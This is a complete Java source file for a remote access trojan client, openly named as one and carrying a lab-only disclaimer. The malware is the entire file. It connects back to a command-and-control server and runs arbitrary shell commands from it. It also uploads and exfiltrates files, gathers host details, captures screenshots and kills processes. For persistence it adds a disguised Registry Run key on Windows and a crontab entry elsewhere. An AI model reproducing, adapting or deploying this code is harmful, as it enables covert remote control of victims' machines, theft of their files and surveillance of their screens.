import java.io.*;
import java.net.*;
import java.util.*;
import java.nio.file.*;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import com.sun.management.OperatingSystemMXBean;

/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * WINDOWS REMOTE ACCESS TROJAN - JAVA CLIENT
 * ═══════════════════════════════════════════════════════════════════════════════
 * 
 * ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY - ISOLATED LAB ENVIRONMENT ONLY
 * ⚠️  UNAUTHORIZED USE IS ILLEGAL - REQUIRES WRITTEN AUTHORIZATION
 * 
 * This trojan demonstrates:
 * 1. Remote Command Execution
 * 2. File Operations (upload/download)
 * 3. System Information Gathering
 * 4. Persistence Mechanisms
 * 5. C2 Communication
 * 6. Process Management
 * 7. Screenshot Capture
 * 
 * ═══════════════════════════════════════════════════════════════════════════════
 */

public class TrojanClient {
    
    // ═══════════════════════════════════════════════════════════════════════════
    // CONFIGURATION - MODIFY THESE FOR YOUR TEST ENVIRONMENT
    // ═══════════════════════════════════════════════════════════════════════════
    
    private static final String C2_SERVER = "192.168.1.100";      // Your C2 server IP
    private static final int C2_PORT = 4444;                       // C2 server port
    private static final int RECONNECT_INTERVAL = 10;              // Seconds between reconnect
    private static final int CHUNK_SIZE = 4096;                    // File transfer chunk size
    
    // ═══════════════════════════════════════════════════════════════════════════
    // MEMBER VARIABLES
    // ═══════════════════════════════════════════════════════════════════════════
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean connected = false;
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 1: SYSTEM INFORMATION GATHERING
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Gather comprehensive system information about the target
     */
    public String getSystemInfo() {
        try {
            StringBuilder info = new StringBuilder();
            
            // Get system properties
            String hostname = InetAddress.getLocalHost().getHostName();
            String osName = System.getProperty("os.name");
            String osVersion = System.getProperty("os.version");
            String osArch = System.getProperty("os.arch");
            String javaVersion = System.getProperty("java.version");
            String username = System.getProperty("user.name");
            
            // Get CPU and memory info
            OperatingSystemMXBean osBean = (OperatingSystemMXBean) 
                ManagementFactory.getOperatingSystemMXBean();
            int processors = osBean.getAvailableProcessors();
            long totalMemory = osBean.getTotalMemorySize();
            long freeMemory = osBean.getFreeMemorySize();
            
            // Build JSON response
            info.append("{\n");
            info.append("  \"hostname\": \"").append(hostname).append("\",\n");
            info.append("  \"os\": \"").append(osName).append("\",\n");
            info.append("  \"os_version\": \"").append(osVersion).append("\",\n");
            info.append("  \"architecture\": \"").append(osArch).append("\",\n");
            info.append("  \"java_version\": \"").append(javaVersion).append("\",\n");
            info.append("  \"username\": \"").append(username).append("\",\n");
            info.append("  \"cpu_count\": ").append(processors).append(",\n");
            info.append("  \"total_memory\": ").append(totalMemory).append(",\n");
            info.append("  \"available_memory\": ").append(freeMemory).append("\n");
            info.append("}");
            
            return info.toString();
        } catch (Exception e) {
            return "Error gathering system info: " + e.getMessage();
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 2: COMMAND EXECUTION ENGINE
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Execute system command on target machine
     */
    public String executeCommand(String command) {
        try {
            // Determine OS to use correct command shell
            String[] cmd;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                // Windows command
                cmd = new String[]{"cmd.exe", "/c", command};
            } else {
                // Linux/Unix command
                cmd = new String[]{"/bin/sh", "-c", command};
            }
            
            // Execute process
            Process process = Runtime.getRuntime().exec(cmd);
            
            // Capture output
            BufferedReader stdInput = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            BufferedReader stdError = new BufferedReader(
                new InputStreamReader(process.getErrorStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            
            // Read stdout
            while ((line = stdInput.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Read stderr
            while ((line = stdError.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Wait for process to complete (timeout: 30 seconds)
            process.waitFor();
            
            return output.toString().isEmpty() ? "[No output]" : output.toString();
            
        } catch (Exception e) {
            return "[Error executing command: " + e.getMessage() + "]";
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 3: FILE OPERATIONS (UPLOAD/DOWNLOAD)
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Send file from target to attacker (download)
     */
    public void sendFile(String filePath) {
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                out.println("FILE_NOT_FOUND");
                out.flush();
                return;
            }
            
            // Send file metadata
            long fileSize = file.length();
            out.println(fileSize);
            out.flush();
            
            // Send file in chunks
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[CHUNK_SIZE];
            int bytesRead;
            
            while ((bytesRead = fis.read(buffer)) != -1) {
                socket.getOutputStream().write(buffer, 0, bytesRead);
                socket.getOutputStream().flush();
            }
            
            fis.close();
            
        } catch (Exception e) {
            System.err.println("Error sending file: " + e.getMessage());
        }
    }
    
    /**
     * Receive file from attacker (upload)
     */
    public void receiveFile(String savePath) {
        try {
            // Read file size
            long fileSize = Long.parseLong(in.readLine());
            
            // Create directories if needed
            File file = new File(savePath);
            file.getParentFile().mkdirs();
            
            // Receive file data
            FileOutputStream fos = new FileOutputStream(file);
            byte[] buffer = new byte[CHUNK_SIZE];
            int bytesRead;
            long totalReceived = 0;
            
            InputStream inputStream = socket.getInputStream();
            
            while (totalReceived < fileSize && 
                   (bytesRead = inputStream.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
                totalReceived += bytesRead;
            }
            
            fos.close();
            
        } catch (Exception e) {
            System.err.println("Error receiving file: " + e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 4: PERSISTENCE MECHANISMS
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Install persistence on Windows
     */
    public String installPersistence() {
        try {
            String osName = System.getProperty("os.name").toLowerCase();
            
            if (osName.contains("win")) {
                // Get JAR path
                String jarPath = getJarPath();
                
                // Add to Windows Startup via Registry
                String command = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run " +
                                "/v SystemService /t REG_SZ /d \"" + jarPath + "\" /f";
                
                executeCommand(command);
                return "Persistence installed via Registry";
                
            } else if (osName.contains("linux") || osName.contains("mac")) {
                // Add to crontab
                String jarPath = getJarPath();
                String command = "echo '* * * * * java -jar " + jarPath + "' | crontab -";
                
                executeCommand(command);
                return "Persistence installed via Crontab";
            }
            
            return "Persistence installation failed";
            
        } catch (Exception e) {
            return "Error installing persistence: " + e.getMessage();
        }
    }
    
    /**
     * Get path to currently running JAR file
     */
    private String getJarPath() {
        try {
            return new File(TrojanClient.class.getProtectionDomain()
                .getCodeSource()
                .getLocation()
                .toURI()
                .getPath()).getAbsolutePath();
        } catch (Exception e) {
            return "";
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 5: PROCESS MANAGEMENT
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Get list of running processes
     */
    public String getRunningProcesses() {
        try {
            StringBuilder processes = new StringBuilder();
            
            String osName = System.getProperty("os.name").toLowerCase();
            String command;
            
            if (osName.contains("win")) {
                command = "tasklist";
            } else {
                command = "ps aux";
            }
            
            return executeCommand(command);
            
        } catch (Exception e) {
            return "Error getting processes: " + e.getMessage();
        }
    }
    
    /**
     * Kill a process by name
     */
    public String killProcess(String processName) {
        try {
            String osName = System.getProperty("os.name").toLowerCase();
            String command;
            
            if (osName.contains("win")) {
                command = "taskkill /IM " + processName + " /F";
            } else {
                command = "killall " + processName;
            }
            
            return executeCommand(command);
            
        } catch (Exception e) {
            return "Error killing process: " + e.getMessage();
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 6: SCREENSHOT CAPTURE
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Take screenshot of victim's screen (Windows only)
     */
    public void takeScreenshot() {
        try {
            String osName = System.getProperty("os.name").toLowerCase();
            
            if (!osName.contains("win")) {
                out.println("Screenshots only supported on Windows");
                out.flush();
                return;
            }
            
            // Use PowerShell to take screenshot
            String psCommand = "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; " +
                    "[System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}'); " +
                    "Start-Sleep -Milliseconds 100; " +
                    "[System.Windows.Forms.Clipboard]::GetDataObject().GetImage().Save(\\\"C:\\\\screenshot.png\\\");\"";
            
            executeCommand(psCommand);
            
            // Send the screenshot
            sendFile("C:\\screenshot.png");
            
            // Clean up
            new File("C:\\screenshot.png").delete();
            
        } catch (Exception e) {
            System.err.println("Error taking screenshot: " + e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 7: C2 COMMUNICATION ENGINE
    // ═══════════════════════════════════════════════════════════════════════════
    
    /**
     * Connect to C2 server
     */
    public boolean connect() {
        try {
            socket = new Socket(C2_SERVER, C2_PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            connected = true;
            
            System.out.println("[+] Connected to C2 server");
            
            // Send initial system info
            out.println("[CONNECTED] " + getSystemInfo());
            out.flush();
            
            return true;
            
        } catch (Exception e) {
            connected = false;
            return false;
        }
    }
    
    /**
     * Receive command from C2 server
     */
    public String receiveCommand() {
        try {
            if (!connected || socket.isClosed()) {
                return null;
            }
            
            // Set socket timeout to avoid hanging
            socket.setSoTimeout(5000);
            
            String command = in.readLine();
            return command;
            
        } catch (SocketTimeoutException e) {
            return null;
        } catch (Exception e) {
            connected = false;
            return null;
        }
    }
    
    /**
     * Execute command based on type received from C2
     */
    public String processCommand(String commandLine) {
        try {
            if (commandLine == null || commandLine.isEmpty()) {
                return null;
            }
            
            // Parse command format: "command:args"
            String[] parts = commandLine.split(":", 2);
            String command = parts[0];
            String args = parts.length > 1 ? parts[1] : "";
            
            switch (command) {
                case "shell":
                    return executeCommand(args);
                
                case "sysinfo":
                    return getSystemInfo();
                
                case "upload":
                    receiveFile(args);
                    return "File uploaded: " + args;
                
                case "download":
                    sendFile(args);
                    return "File sent: " + args;
                
                case "screenshot":
                    takeScreenshot();
                    return "Screenshot sent";
                
                case "processes":
                    return getRunningProcesses();
                
                case "kill":
                    return killProcess(args);
                
                case "start":
                    return executeCommand(args);
                
                case "persist":
                    return installPersistence();
                
                case "list_files":
                    return listDirectory(args);
                
                case "exit":
                    connected = false;
                    return "Exiting...";
                
                default:
                    return "Unknown command";
            }
            
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
    }
    
    /**
     * List directory contents
     */
    public String listDirectory(String dirPath) {
        try {
            File dir = new File(dirPath);
            
            if (!dir.exists()) {
                return "Directory not found: " + dirPath;
            }
            
            StringBuilder files = new StringBuilder();
            files.append("[\n");
            
            File[] fileList = dir.listFiles();
            if (fileList != null) {
                for (int i = 0; i < fileList.length; i++) {
                    files.append("  \"").append(fileList[i].getName()).append("\"");
                    if (i < fileList.length - 1) {
                        files.append(",");
                    }
                    files.append("\n");
                }
            }
            
            files.append("]");
            return files.toString();
            
        } catch (Exception e) {
            return "Error listing directory: " + e.getMessage();
        }
    }
    
    /**
     * Send response back to C2 server
     */
    public void sendResponse(String response) {
        try {
            if (connected && socket != null && !socket.isClosed()) {
                out.println(response);
                out.flush();
            }
        } catch (Exception e) {
            System.err.println("Error sending response: " + e.getMessage());
            connected = false;
        }
    }
    
    /**
     * Main trojan loop - connects, waits for commands, executes, repeats
     */
    public void run() {
        System.out.println("[*] Starting Remote Access Trojan Client...");
        System.out.println("[*] Targeting C2 Server: " + C2_SERVER + ":" + C2_PORT);
        
        while (true) {
            // Try to connect if not connected
            if (!connected) {
                System.out.println("[*] Attempting to connect to C2 server...");
                
                if (!connect()) {
                    System.out.println("[-] Connection failed, retrying in " + RECONNECT_INTERVAL + " seconds...");
                    
                    try {
                        Thread.sleep(RECONNECT_INTERVAL * 1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    continue;
                }
            }
            
            // Receive and execute commands
            String commandLine = receiveCommand();
            
            if (commandLine == null) {
                // Connection lost, try to reconnect
                try {
                    if (socket != null) socket.close();
                } catch (Exception e) {
                    // Ignore
                }
                connected = false;
                continue;
            }
            
            try {
                // Execute command
                String output = processCommand(commandLine);
                
                // Send result back to C2
                if (output != null) {
                    sendResponse(output);
                }
                
                // Exit if requested
                if (commandLine.startsWith("exit")) {
                    break;
                }
                
            } catch (Exception e) {
                sendResponse("Error: " + e.getMessage());
                connected = false;
            }
        }
        
        // Cleanup
        try {
            if (socket != null) socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // ═══════════════════════════════════════════════════════════════════════════
    // MAIN ENTRY POINT
    // ═══════════════════════════════════════════════════════════════════════════
    
    public static void main(String[] args) {
        /*
         * Start trojan client
         * 
         * This will:
         * 1. Connect to C2 server
         * 2. Send system information
         * 3. Wait for and execute commands
         * 4. Maintain connection with reconnect capability
         */
        TrojanClient trojan = new TrojanClient();
        trojan.run();
    }
}
